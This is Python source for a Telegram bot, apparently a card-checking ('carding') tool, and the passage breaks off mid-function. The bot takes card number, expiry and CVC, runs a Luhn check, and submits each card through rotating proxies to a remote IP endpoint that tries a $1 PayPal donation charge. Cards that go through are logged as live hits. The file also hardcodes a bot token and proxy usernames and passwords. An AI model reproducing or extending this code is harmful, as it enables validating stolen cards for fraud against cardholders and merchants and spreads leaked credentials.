import telebot
import time
import threading
import requests
import re
import random
from telebot import types
from datetime import datetime

token = '7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU'
bot = telebot.TeleBot(token, parse_mode="HTML")

admin = 7077294261
stopuser = {}

# ================== PROXIES ==================
PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

def get_proxy():
    proxy_str = random.choice(PROXIES)
    user, passw, host, port = proxy_str.split(':')
    proxy_url = f"http://{user}:{passw}@{host}:{port}"
    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY USED → {host}:{port}")
    return {"http": proxy_url, "https": proxy_url}, f"{host}:{port}"

# ================== CHECKER WITH FULL LOGS ==================
def pali(ccx):
    ccx = ccx.strip()
    current_time = datetime.now().strftime('%H:%M:%S')
    
    proxy_dict, proxy_used = get_proxy()
    
    print(f"[{current_time}] CHECKING → {ccx}")
    
    try:
        url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
        print(f"[{current_time}] API CALL → {url}")
        
        r = requests.get(url, proxies=proxy_dict, timeout=30)
        text = r.text
        
        print(f"[{current_time}] STATUS CODE → {r.status_code}")
        print(f"[{current_time}] RESPONSE → {text[:400]}")
        
        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
            print(f"[{current_time}] ✅ LIVE HIT (CHARGE 1.00$)")
            return "CHARGE 1.00$"
        else:
            print(f"[{current_time}] ❌ DECLINED")
            return "DECLINED"

    except Exception as e:
        print(f"[{current_time}] ❌ ERROR: {e}")
        return "ERROR"


# ================== CARD REGEX ==================
def luhn_check(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p]
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if not luhn_check(pan):
            return None
        return f"{pan}|{mm}|{yy}|{cvc}"
    return None


# ================== BOT ==================
@bot.message_handler(commands=["start"])
def handle_start(message):
    mes = types.InlineKeyboardMarkup()
    mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))
    bot.send_message(message.chat.id, f"Hi {message.from_user.first_name}, Welcome To Toman Checker (PayPal)", reply_markup=mes)


@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    bot.send_message(call.message.chat.id, "Welcome to PayPal Custom Checker\nUse /pp for single check or send .txt file")


@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp')))
def single_check(message):
